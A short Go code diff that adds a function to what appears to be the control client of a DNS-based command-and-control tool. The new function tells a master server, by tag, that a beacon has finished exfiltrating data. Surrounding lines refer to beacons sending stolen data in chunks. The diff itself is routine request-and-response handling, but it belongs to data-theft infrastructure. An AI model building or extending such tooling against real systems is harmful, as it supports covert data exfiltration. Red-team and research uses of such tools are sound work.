@@ -558,6 +558,31 @@ func (mc *MasterClient) MarkExfilComplete(req ExfilCompleteRequest) error {
 	return nil
 }
 
+// MarkExfilCompleteByTag notifies the Master Server that a session finished transferring using only the tag
+func (mc *MasterClient) MarkExfilCompleteByTag(tag string) error {
+	req := map[string]interface{}{
+		"dns_server_id": mc.serverID,
+		"api_key":       mc.apiKey,
+		"tag":           tag,
+	}
+
+	respData, err := mc.doRequest("POST", "/api/dns-server/exfil/complete/tagged", req)
+	if err != nil {
+		return fmt.Errorf("tagged exfil completion submit failed: %w", err)
+	}
+
+	var resp APIResponse
+	if err := json.Unmarshal(respData, &resp); err != nil {
+		return fmt.Errorf("failed to parse tagged exfil completion response: %w", err)
+	}
+
+	if !resp.Success {
+		return fmt.Errorf("tagged exfil completion rejected: %s", resp.Message)
+	}
+
+	return nil
+}
+
 // MarkTaskComplete notifies the Master that the beacon has finished exfiltrating all chunks
 // This is called when the DNS server receives the RESULT_COMPLETE message from the beacon
 func (mc *MasterClient) MarkTaskComplete(taskID, beaconID string, totalChunks int) error {
